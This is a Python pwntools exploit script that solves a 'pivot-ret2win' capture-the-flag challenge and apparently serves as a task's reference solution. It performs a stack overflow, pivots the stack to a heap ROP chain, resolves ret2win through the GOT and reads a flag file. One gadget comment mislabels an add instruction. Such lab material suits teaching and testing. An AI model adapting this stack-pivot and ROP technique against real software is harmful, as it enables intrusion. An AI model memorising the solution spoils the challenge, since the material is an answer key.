#!/usr/bin/env python3
"""
Exploit for pivot-ret2win challenge.

Technique combination:
  1. Stack pivot  -- limited overflow forces rsp redirect to heap
  2. GOT/PLT resolution -- call unimported ret2win via foothold offset
  3. ROP gadget chaining -- use usefulGadgets for register/memory control
  4. Argument setup -- three magic uint64 values in rdi, rsi, rdx
"""

import os
import re
import subprocess

os.environ["PWNLIB_NOTERM"] = "1"

from pwn import *  # noqa: E402

context.arch = "amd64"
context.log_level = "info"

# ---------------------------------------------------------------------------
# 1. Static analysis using command-line tools
#    (avoids pwntools unicorn-based PLT parsing which fails on Ubuntu 24.04)
# ---------------------------------------------------------------------------

# Find usefulGadgets symbol address via nm
nm_out = subprocess.check_output(["nm", "/app/challenge"], text=True)
useful = None
for line in nm_out.strip().split("\n"):
    parts = line.strip().split()
    if len(parts) >= 3 and parts[2] == "usefulGadgets":
        useful = int(parts[0], 16)
        break
assert useful is not None, "Could not find usefulGadgets symbol"

# Find foothold_function PLT stub address via objdump -d
objdump_out = subprocess.check_output(["objdump", "-d", "/app/challenge"], text=True)
foothold_plt = None
for line in objdump_out.split("\n"):
    if "<foothold_function@plt>" in line and line.strip().endswith(":"):
        addr_str = line.strip().split()[0].rstrip(":")
        foothold_plt = int(addr_str, 16)
        break
assert foothold_plt is not None, "Could not find foothold_function PLT entry"

# Find foothold_function GOT slot address via objdump -R
objdump_r = subprocess.check_output(["objdump", "-R", "/app/challenge"], text=True)
foothold_got = None
for line in objdump_r.split("\n"):
    if "foothold_function" in line:
        addr_str = line.strip().split()[0]
        foothold_got = int(addr_str, 16)
        break
assert foothold_got is not None, "Could not find foothold_function GOT entry"

# Find library symbol offsets to compute ret2win - foothold_function
nm_lib = subprocess.check_output(["nm", "/app/libtarget.so"], text=True)
lib_foothold = None
lib_ret2win = None
for line in nm_lib.strip().split("\n"):
    parts = line.strip().split()
    if len(parts) >= 3:
        if parts[2] == "foothold_function":
            lib_foothold = int(parts[0], 16)
        elif parts[2] == "ret2win":
            lib_ret2win = int(parts[0], 16)

assert lib_foothold is not None, "Could not find foothold_function in libtarget.so"
assert lib_ret2win is not None, "Could not find ret2win in libtarget.so"

lib_offset = lib_ret2win - lib_foothold

# Gadget offsets within usefulGadgets section:
#  +0:  pop rax; ret          (58 c3)
#  +2:  xchg rax, rsp; ret    (48 94 c3)
#  +5:  mov (rax), rax; ret   (48 8b 00 c3)
#  +9:  add rbp, rax; ret     (48 01 e8 c3)
#  +13: pop rbp; ret          (5d c3)
#  +15: pop rdi; ret          (5f c3)
#  +17: pop rsi; ret          (5e c3)
#  +19: pop rdx; ret          (5a c3)
#  +21: jmp *rax              (ff e0)
pop_rax_ret       = useful + 0
xchg_rax_rsp_ret  = useful + 2
mov_deref_rax_ret = useful + 5
add_rbp_rax_ret   = useful + 9
pop_rbp_ret       = useful + 13
pop_rdi_ret       = useful + 15
pop_rsi_ret       = useful + 17
pop_rdx_ret       = useful + 19
jmp_rax           = useful + 21

log.info("usefulGadgets  @ %#x", useful)
log.info("foothold PLT   @ %#x", foothold_plt)
log.info("foothold GOT   @ %#x", foothold_got)
log.info("lib offset     = %#x (%d)", lib_offset, lib_offset)

# Magic arguments expected by ret2win()
ARG1 = 0xDEADBEEFDEADBEEF
ARG2 = 0xCAFEBABECAFEBABE
ARG3 = 0xD00DF00DD00DF00D

# ---------------------------------------------------------------------------
# 2. Dynamic interaction
# ---------------------------------------------------------------------------
p = process("/app/challenge")

p.recvuntil(b"Pivot destination: ")
heap_addr = int(p.recvline().strip(), 16)
log.info("Heap pivot addr = %#x", heap_addr)

# ---------------------------------------------------------------------------
# 3. Build the heap chain (main ROP payload, placed at heap_addr)
# ---------------------------------------------------------------------------
chain = b""

# 3a. Call foothold_function@PLT to trigger lazy binding (populates GOT)
chain += p64(foothold_plt)

# 3b. Load the now-resolved GOT entry into rax
chain += p64(pop_rax_ret)
chain += p64(foothold_got)
chain += p64(mov_deref_rax_ret)   # rax = *GOT = runtime addr of foothold

# 3c. Compute ret2win runtime address: rax += lib_offset (via rbp)
chain += p64(pop_rbp_ret)
chain += p64(lib_offset % (1 << 64))  # handle signed offset safely
chain += p64(add_rbp_rax_ret)     # rax = foothold_runtime + offset = ret2win

# 3d. Set up arguments
chain += p64(pop_rdi_ret)
chain += p64(ARG1)
chain += p64(pop_rsi_ret)
chain += p64(ARG2)
chain += p64(pop_rdx_ret)
chain += p64(ARG3)

# 3e. Jump to ret2win
chain += p64(jmp_rax)

log.info("Heap chain: %d bytes (%d qwords)", len(chain), len(chain) // 8)
assert len(chain) <= 256, "Heap chain exceeds 256-byte limit"

# Send the heap chain
p.recvuntil(b"chain> ")
p.send(chain)

# ---------------------------------------------------------------------------
# 4. Build the stack smash (pivot gadget sequence)
# ---------------------------------------------------------------------------
# Buffer is 32 bytes at rbp-0x20; saved rbp at rbp; return addr at rbp+0x08.
# Offset from buf to return address = 0x20 + 0x08 = 40 bytes.
PADDING = 40

smash  = b"A" * PADDING
smash += p64(pop_rax_ret)          # overwrite return address
smash += p64(heap_addr)            # value popped into rax
smash += p64(xchg_rax_rsp_ret)    # rsp <-> rax  =>  pivot!

log.info("Stack smash: %d bytes", len(smash))

p.recvuntil(b"smash> ")
p.send(smash)

# ---------------------------------------------------------------------------
# 5. Wait for completion
# ---------------------------------------------------------------------------
try:
    p.recvall(timeout=5)
except Exception:
    pass
p.close()

if os.path.exists("/app/flag.txt"):
    with open("/app/flag.txt") as f:
        log.success("Flag: %s", f.read().strip())
else:
    log.error("flag.txt was not produced!")
